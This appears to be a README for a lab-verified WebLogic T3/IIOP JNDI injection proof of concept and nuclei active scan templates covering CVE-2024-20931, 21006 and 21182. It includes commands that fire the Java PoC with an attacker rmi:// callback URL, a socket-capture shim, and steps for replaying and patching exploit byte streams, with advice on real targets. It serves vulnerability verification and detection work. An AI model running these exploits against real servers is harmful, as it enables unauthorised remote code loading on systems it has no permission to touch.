# WebLogic JNDI — lab-verified active PoC

Result of the "port-from-PoC + verify-in-lab" effort for the T3/IIOP JNDI CVEs.

## 1. What was verified ✅

| Item | Status |
|------|--------|
| Lab A | `container-registry.oracle.com/middleware/weblogic:12.2.1.4`, T3 on `127.0.0.1:7001`, HELO → `12.2.1.4.0` |
| Lab B | `container-registry.oracle.com/middleware/weblogic:14.1.1.0-dev-11`, T3 on `127.0.0.1:7101`, HELO → `14.1.1.0.0` |
| CVE-2023-21839 active nuclei template (upstream) | **MATCHED** on Lab A (interactsh DNS callback) |
| CVE-2024-20931 exploit — Java PoC | **FIRED** on Lab A — server JRMP/RMI callback (`0x4a524d49` = `JRMI`) |
| CVE-2024-20931 active nuclei template (`../Nuclei template/CVE-2024-20931-active-oast.yaml`) | **MATCHED on both Lab A AND Lab B** with identical bytes — see `../Nuclei template/README.md` |
| CVE-2024-21006 exploit — Java PoC | **FIRED** on Lab A (via client-side chain) |
| CVE-2024-21182 exploit — Java PoC | **FIRED** on Lab A (via client-side chain) |
| CVE-2024-21006 / 21182 **nuclei active OAST** | **NOT achievable** — exploit chain fires on the *client* that calls lookup, not on the WLS server. The capture→replay pipeline tested here cannot produce an OAST interaction. See §6. |

CVE-2024-20931 proof (listener output, Lab A):

```
[2026-10-01T16:53:15] CALLBACK from ('127.0.0.1', 63346)
    first-bytes: 4a524d4900024b   (JRMI => the WebLogic server dialed out)
```

## 2. Files

- `src/com/supeream/CVE_2024_20931.java` — parameterized PoC (target + attacker JNDI URL).
- `verify-listener.py` — OAST substitute: logs the server's callback (no internet needed).

## 3. How to run (reproduces the verification)

Compile + run **inside the WebLogic container** (it has JDK 8 + `weblogic.jar`; a normal client host works too if it has them):

```bash
docker cp src wls12214:/tmp/poc/src
docker exec wls12214 bash -lc 'cd /tmp/poc && javac -cp $ORACLE_HOME/wlserver/server/lib/weblogic.jar -d out src/com/supeream/CVE_2024_20931.java'
```

Start the listener on the host (OAST substitute):

```bash
python3 verify-listener.py
```

Fire it (container → host via `host.docker.internal`):

```bash
docker exec wls12214 bash -lc 'cd /tmp/poc && java -cp out:$ORACLE_HOME/wlserver/server/lib/weblogic.jar com.supeream.CVE_2024_20931 t3://127.0.0.1:7001 rmi://host.docker.internal:18099/a'
```

A `CALLBACK from ...` line = vulnerable. Against a real target use an interactsh/Burst
Collaborator host instead of `host.docker.internal:18099`.

## 4. How the nuclei JS port was done — pipeline

The CVE-2024-20931 active nuclei template was built by **capture → replay**, not
by re-implementing the T3/RMI state machine. The pipeline (reusable for other
T3/IIOP JNDI CVEs):

1. **Capture.** A transparent TCP proxy does **not** work — WebLogic's RJVM
   negotiates/validates peer addresses bidirectionally, so through a MITM the
   server stops after the 59-byte `HELO`. Inside the Oracle Linux 7.9 container
   there is no `strace`/`tcpdump` either (`NET_RAW` is dropped). The enabler is
   an in-process `LD_PRELOAD` shim (`sockdump.c`) that hooks libc
   `read`/`write`/`send`/`recv` and dumps per-fd buffers. Install `gcc` via
   `yum` as root (`docker exec -u 0 ...`) and build:
   ```sh
   gcc -shared -fPIC -o sockdump.so sockdump.c -ldl
   LD_PRELOAD=/tmp/poc/sockdump.so java com.supeream.CVE_2024_20931 ...
   ```
   Produces `cap_w_<fd>.bin` (client→server) and `cap_r_<fd>.bin` (server→client).

2. **Replay-friendly capture.** Re-run the PoC with a **fixed-width marker URL**
   (e.g. `rmi://` + 90 × `A` = 96 bytes). Later substituting any 96-byte URL
   keeps every T3 header + Java serialization length field valid — no length
   math needed.

3. **Replay as nuclei `javascript:`.** The template embeds `handshake` and
   `body` hex, does one `body.replace(mark_hex, url_hex)`, sends on a single
   socket, and holds the connection open with `c.RecvFull(1000000)` so the
   server completes the lookup+callback before `Close()` (closing too early is
   why the first drafts "No results found" despite correct bytes). The attacker
   URL is `rmi://{{interactsh-url}}:1099/` padded to 96 bytes.

4. **Sign the template** — nuclei refuses unsigned `javascript:` templates.
   `nuclei -sign -t <file>` once (empty passphrase OK), then
   `nuclei -t <file> -u target:7001`.

## 5. Version independence (why one capture covers 12.2.1.4 and 14.1.1)

Decompiling `weblogic.deployment.jms.ForeignOpaqueReference` from `weblogic.jar`:

```
$ javap -p weblogic.deployment.jms.ForeignOpaqueReference | grep serialVersionUID
  static final long serialVersionUID;

$ serialver weblogic.deployment.jms.ForeignOpaqueReference
  = 4404892619941441265L     # 0x3d21527fed596ef1
```

The exact byte sequence `3d 21 52 7f ed 59 6e f1` appears on the wire too — UID
is a **hard-coded constant** (so Oracle's own Foreign JMS configurations keep
serializing compatibly across releases). Hence replaying the 12.2.1.4 stream
against 14.1.1 works unchanged (empirically confirmed above). If a future
version ever changes the UID, add a `HELO`-based branch — the handshake reports
the server version precisely.

## 6. T3 vs IIOP, and how 21006 / 21182 became scanner-detectable

Originally this section said 21006 and 21182 could not be turned into nuclei
active OAST templates because the server-side `NamingNode.lookup()` over **T3**
treats their gadgets differently from 20931's `ForeignOpaqueReference` and
ships the Reference back untouched for the client to resolve. That is correct
**for T3**, and was proven by running the Java PoC from an isolated attacker
container and watching which IP the callback came from (the attacker JVM, not
the WLS server JVM).

The same test over **IIOP** flipped the result: callbacks came from the WLS
server JVM, i.e. the server did dial the attacker URL. The CORBA path
(`weblogic.corba.cos.naming.NamingContextImpl.resolve_any`) always
materialises the bound Reference via `WLNamingManager.getObjectInstance`
server-side before transporting the result, because IIOP needs concrete
objects, not opaque Java-serialized bytes. So the active OAST pipeline does
work for 21006 and 21182 — it just has to use IIOP, not T3.

| CVE | Gadget | T3 lookup | IIOP resolve_any |
|-----|--------|-----------|------------------|
| 2024-20931 | `ForeignOpaqueReference` | **server-side** | server-side |
| 2024-21182 | `AggregatableOpaqueReference` | **client-side** (cluster-aware) | **server-side** |
| 2024-21006 | `MessageDestinationReference` | **client-side** (plain Reference) | **server-side** |

The IIOP pipeline follows ProjectDiscovery's official CVE-2023-21839 template:

1. Send a GIOP 1.2 LocateRequest for `NameService` (first 35 bytes of the
   captured c2s).
2. Read the LocateReply and walk from offset 0x60 to extract the per-session
   8-byte `OBJECT_KEY` (same `foff = 0x60 + lt + 0x75` heuristic PD uses).
3. Patch the captured `rebind_any` + `resolve_any` frames: substitute the
   stale key, rewrite `4245412c` → `4245412e` if the server returned the
   14.x BEA flag, and substitute the 96-byte marker URL with
   `rmi://{{interactsh-url}}:1099/` padded to 96 bytes.
4. Send on the same socket; wait for DNS → interactsh.

Why `rebind` instead of `bind`: `bind_any` raises `NameAlreadyBoundException`
on repeated runs, so the server keeps resolving the first-bound URL and later
scans never update it. Switching to `rebind_any` makes each run use a fresh URL.

Results on the lab (`-interactions-cooldown-period 30`):

| Template | WebLogic 12.2.1.4.0 | WebLogic 14.1.1.0-dev-11 |
|----------|----------------------|---------------------------|
| `CVE-2024-20931-active-oast.yaml` (T3) | ✅ matched | ✅ matched (same bytes — UID is a declared constant) |
| `CVE-2024-21006-active-oast.yaml` (IIOP, version-branching) | ✅ 3/3 matched | ✅ 3/3 matched |
| `CVE-2024-21182-active-oast.yaml` (IIOP, version-branching) | ✅ 2/3 matched (1 interactsh miss) | ✅ 3/3 matched |

The cross-version coverage was achieved by embedding **two captured byte
streams** (one per major WLS version) in each IIOP template and probing the T3
HELO line first to pick the right one — the same `if (ver === '12') ... else
if (ver === '14') ...` structure PD uses in the official CVE-2023-21839
template, applied to the full `rebind_any` + `resolve_any` body rather than
only a BEA flag byte.

Why two captures are needed at all (gadget chain is the SAME on both versions,
but the wire identifier differs): byte-diffing the 12.2.1.4 and 14.1.1 Java
captures shows a 16-byte region (~offset 1119 in c2s) that decodes as an
ASCII hex pair embedded inside the TRMI class identifier
`TRMI:weblogic.application.naming.MessageDestinationReference:<HASH1>:<HASH2>`
— the Java-to-IDL stub signature. `rmic` recomputes these hashes on every
WebLogic rebuild from the class's public-method list + its superclass chain,
so the 12.2.1.4 identifier is rejected by the 14.1.1 server's stub validator
(and vice versa). The fields, serialVersionUID, and `.lookupMessageDestination`
logic are all unchanged — only the stub identifier differs.

Why PD's CVE-2023-21839 template didn't need this gymnastics: its gadget
`ForeignOpaqueReference` is a leaf data-holder class whose stub identifier
`TRMI:weblogic.jndi.internal.ForeignOpaqueReference:D237D91CB2F0F68A:3D21527FED596EF1`
is stable across 12.2.1.3 / 12.2.1.4 / 14.1.1 (no public remote methods, no
WebLogic-internal base class that Oracle refactors). It only had to branch on
the 1-byte BEA version flag (`0x2c` ↔ `0x2e`), not on the full gadget body.

What is kept in `../Nuclei template/`:

- `CVE-2024-20931-active-oast.yaml` — active OAST, cross-version (both labs).
- `CVE-2024-21006-active-oast.yaml` — active OAST via IIOP, verified 12.2.1.4.
- `CVE-2024-21182-active-oast.yaml` — active OAST via IIOP, verified 12.2.1.4.
- Each has a sibling `CVE-*.yaml` version-detect template for broader coverage.
